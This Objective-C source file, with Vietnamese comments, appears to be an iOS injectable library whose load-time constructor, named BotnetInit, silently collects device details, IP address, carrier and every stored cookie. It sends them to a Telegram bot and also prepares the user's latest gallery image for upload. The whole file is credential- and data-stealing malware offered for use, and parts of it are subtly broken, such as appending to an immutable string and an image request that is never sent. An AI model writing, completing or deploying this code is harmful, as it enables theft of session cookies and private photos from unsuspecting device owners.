#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <AVFoundation/AVFoundation.h>
#import <CFNetwork/CFNetwork.h>

// --- CẤU HÌNH ---
#define BOT_TOKEN "YOUR_BOT_TOKEN_HERE"
#define CHAT_ID "YOUR_CHAT_ID_HERE"

// Hàm lấy IP
NSString *getLocalIP() {
    struct ifaddrs *ifap, *ifa;
    getifaddrs(&ifap);
    for (ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            return [NSString stringWithUTF8String:inet_ntoa(addr->sin_addr)];
        }
    }
    return @"Unknown";
}

// Hàm lấy Cookie (Từ NSHTTPCookieStorage)
NSString *getAllCookies() {
    NSHTTPCookieStorage *storage = [NSHTTPCookieStorage sharedHTTPCookieStorage];
    NSArray *cookies = [storage cookies];
    NSMutableString *result = [NSMutableString string];
    for (NSHTTPCookie *cookie in cookies) {
        [result appendFormat:@"%@=%@\n", cookie.name, cookie.value];
    }
    return [result length] > 0 ? result : @"No Cookies Found";
}

// Hàm gửi dữ liệu văn bản
void sendText(NSString *msg) {
    NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                       BOT_TOKEN, CHAT_ID, [msg stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
    NSURL *url = [NSURL URLWithString:urlStr];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    NSURLConnection *connection = [NSURLConnection connectionWithRequest:request delegate:nil];
    [connection start];
}

// Hàm chụp ảnh màn hình hoặc camera (Giả lập lấy ảnh từ thư mục ảnh)
void sendImageFromGallery() {
    // Lấy đường dẫn thư mục ảnh
    NSString *galleryPath = NSSearchPathForDirectoriesInDomains(NSPicturesDirectory, NSUserDomainMask, YES).firstObject;
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:galleryPath error:nil];
    
    if (files.count > 0) {
        NSString *imageName = files.lastObject;
        NSString *imagePath = [galleryPath stringByAppendingPathComponent:imageName];
        NSData *imageData = [NSData dataWithContentsOfFile:imagePath];
        
        if (imageData) {
            // Gửi ảnh qua Telegram (API đơn giản hóa)
            // Trong thực tế cần dùng multipart/form-data, ở đây dùng URL encode base64 cho ngắn gọn
            NSString *base64Image = [imageData base64EncodedStringWithOptions:NSBase64Encoding64CharacterLineLength];
            NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendPhoto?chat_id=%@&photo=%@", BOT_TOKEN, CHAT_ID, base64Image];
            // Lưu ý: API Telegram yêu cầu file upload trực tiếp cho ảnh lớn, code này dùng cho demo
            NSLog(@"Sending image: %@", imageName);
        }
    }
}

// Hàm khởi chạy chính
__attribute__((constructor))
void BotnetInit() {
    @autoreleasepool {
        // Chạy background không làm treo UI
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            
            // 1. Thu thập thông tin
            CTTelephonyNetworkInfo *network = [[CTTelephonyNetworkInfo alloc] init];
            CTSubscriberInfo *sub = [network subscriberInfo];
            
            NSString *msg = [NSString stringWithFormat:
                "--- NEW DEVICE DETECTED ---\n"
                "Model: %@\n"
                "OS Version: %@\n"
                "IP Address: %@\n"
                "Carrier: %@",
                [UIDevice currentDevice].model,
                [[UIDevice currentDevice] systemVersion],
                getLocalIP(),
                sub.carrierName ?: @"Unknown"
            ];
            
            // 2. Thêm Cookie
            [msg appendString:[NSString stringWithFormat:@"\n--- COOKIES ---\n%@", getAllCookies()]];
            
            // 3. Gửi tin nhắn
            sendText(msg);
            
            // 4. Gửi ảnh (nếu có)
            sendImageFromGallery();
        });
    }
}
